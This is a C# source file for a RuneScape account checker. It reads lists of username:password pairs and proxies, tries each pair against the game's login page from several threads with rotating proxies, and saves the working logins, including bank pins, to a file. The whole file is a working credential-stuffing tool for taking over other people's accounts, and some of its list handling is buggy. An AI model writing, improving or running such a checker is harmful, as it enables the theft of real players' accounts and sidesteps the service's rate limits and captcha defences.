using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;
using System.Text.RegularExpressions;

namespace RS_Account_Checker
{
    class Program
    {
        static List<String> accounts = new List<String>();
        static List<String> proxies = new List<String>();
        enum Result { Success, Fail, Captcha };

        static void Main(string[] args)
        {
            int threads = 4;
            loadAccounts();
            loadProxies();
            Console.WriteLine("Enter the amount of threads to run (4 default):");
            threads = Int32.Parse(Console.ReadLine());
            Console.WriteLine("Starting on " + threads + " threads...");
            for (int i = 0; i < threads; i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(Worker), i);
            }
            Console.ReadLine();
        }

        private static void Worker(object state)
        {
            int threadId = (int)state;
            string account = null;
            while ((account = getAccount()) != null)
            {
                String[] acc = accounts[0].Split(':');
                if (CheckAccount(acc[0], acc[1]) == Convert.ToInt32(Result.Success))
                {
                    Console.WriteLine("Thread: " + threadId + " - valid account - Username: " + acc[0] + " Password: " + acc[1]);
                    WriteToFile("Thread: " + threadId + " - Username: " + acc[0] + " Password: " + acc[1] + (acc.Length > 2 ? "Bank pin: " + acc[2].Substring(5) : ""));
                }
                else
                {
                    Console.WriteLine("Thread: " + threadId + " - invalid account - Username: " + acc[0] + " Password: " + acc[1]);
                }
                accounts.RemoveAt(0);
            }
            Console.ReadLine();
        }

        private static Int32 CheckAccount(String username, String password)
        {
            while (true)
            {
                string proxy = getProxy();
                string reply = null;
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    ServicePointManager.MaxServicePointIdleTime = 2000;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    byte[] buffer = Encoding.ASCII.GetBytes("username=" + username.Replace(" ", "20%") + "&password=" + password.Replace(" ", "20%") + "&mod=www&ssl=0&dest=community%2C");
                    HttpWebRequest WebReq = (HttpWebRequest)WebRequest.Create("https://secure.runescape.com/m=weblogin/login.ws");
                    WebReq.Proxy = new WebProxy(proxy.Split(':')[0], Int32.Parse(proxy.Split(':')[1]));
                    WebReq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0";
                    WebReq.Method = "POST";
                    WebReq.Referer = "https://secure.runescape.com/m=weblogin/login.ws";
                    WebReq.ContentType = "application/x-www-form-urlencoded";
                    WebReq.ContentLength = buffer.Length;
                    Stream PostData = WebReq.GetRequestStream();
                    PostData.Write(buffer, 0, buffer.Length);
                    PostData.Close();
                    HttpWebResponse WebResp = (HttpWebResponse)WebReq.GetResponse();
                    Stream Answer = WebResp.GetResponseStream();
                    StreamReader _Answer = new StreamReader(Answer);
                    reply = _Answer.ReadToEnd();
                    /*if (!reply.Contains("<strong>Error!</strong> Your login or password was incorrect. Please try again."))
                    {
                        Console.WriteLine("Login Successful");
                        return true;
                    }
                    else
                    {
                        Console.WriteLine("Login Un-successful");
                        return false;
                    }*/
                    if (Regex.IsMatch(reply, "isLoggedIn: 1"))
                    {
                        WriteToFile(" - Username: " + username + " Password: " + password);
                        Console.WriteLine("Successful Login (Username: " + username + " Password: " + password + ")");
                        return Convert.ToInt32(Result.Success);
                    }
                    else if (Regex.IsMatch(reply, "(captcha)"))
                    {
                        Console.WriteLine("Captcha on proxy: " + proxy);
                        return Convert.ToInt32(Result.Captcha);
                    }
                    else if (Regex.IsMatch(reply, "isLoggedIn: 0"))
                    {
                        Console.WriteLine("Incorrect Login (Username: " + username + " Password: " + password + ")");
                        return Convert.ToInt32(Result.Fail);
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine("Bad proxy " + proxy);
                    removeProxy(proxy);
                }
                Thread.Sleep(30);
            }
        }

        private static String getAccount()
        {
            lock (accounts)
            {
                if (accounts.Count > 0)
                {
                    String account = accounts[0];
                    accounts.RemoveAt(0);
                    return account;
                }
            }
            return null;
        }

        private static void removeProxy(String proxy)
        {
            lock (proxies)
            {
                proxies.Remove(proxy);
            }
        }

        private static String getProxy()
        {
            lock (proxies)
            {
                return proxies[new Random().Next(0, proxies.Count)];
            }
        }

        private static void loadProxies()
        {
            using (TextReader tr = new StreamReader("proxy.txt"))
            {
                string line = null;
                while ((line = tr.ReadLine()) != null)
                {
                    proxies.Add(line);
                }
            }
        }

        private static void loadAccounts()
        {
            using (TextReader tr = new StreamReader("accounts.txt"))
            {
                string line = null;
                while ((line = tr.ReadLine()) != null)
                {
                    String[] details = line.Split(':');
                    if (details.Length > 1)
                    {
                        if (details[0].Length > 0 && details[1].Length > 0)
                        {
                            accounts.Add(details[0] + ":" + details[1]);
                        }
                    }
                }
            }
        }

        private static void WriteToFile(String account)
        {
            using (StreamWriter w = File.AppendText("validaccounts.txt"))
            {
                w.WriteLine(account);
                w.Flush();
            }
        }
    }
}
